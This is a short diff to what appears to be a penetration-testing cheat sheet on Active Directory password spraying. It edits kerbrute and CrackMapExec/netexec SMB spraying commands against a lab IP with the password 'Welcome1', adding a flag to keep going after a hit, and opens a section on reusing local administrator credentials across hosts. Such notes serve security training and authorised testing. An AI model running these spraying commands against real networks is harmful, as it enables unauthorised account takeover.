@@ -11,8 +11,8 @@ kerbrute passwordspray -d domain.local --dc <Target-IP> valid_users.txt  Welcome
 ```
 ## Using CrackMapExec/netexec & Filtering Logon Failures
 ```shell
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
-sudo netexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success | grep +
+sudo netexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success | grep +
 ```
 ## Local Administrator Password Reuse
 If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network.
